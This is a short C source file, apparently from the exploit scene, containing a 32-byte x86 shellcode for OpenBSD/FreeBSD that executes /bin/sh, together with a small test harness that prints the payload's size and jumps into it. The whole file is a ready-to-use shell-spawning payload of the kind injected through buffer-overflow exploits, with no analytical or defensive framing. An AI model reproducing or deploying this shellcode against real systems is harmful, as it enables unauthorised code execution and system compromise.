/* nirosys@0xcd80.org
 * * * * * * * * * * * *
 * traditional /bin/sh shellcode
 * for [fo]BSD
 *
 * 32bytes.
 * * * * * * * * * * * *
 */

char	CD80_oBSDShell[] = {
   "\xb8\x2f\x73\x68\x23\x25\x2f\x73\x68\xdc\x50\x68\x2f\x62\x69\x6e"
   "\x89\xe3\x31\xc0\x50\x53\x89\xe1\x50\x51\x53\xb0\x3b\x50\xcd\x80"
};



int main( argc, argv )
    int argc;
    char **argv;
{
    void (*func)() = CD80_oBSDShell;
    printf("Shellcode Size = %d bytes\n",strlen(CD80_oBSDShell));
    func();
}
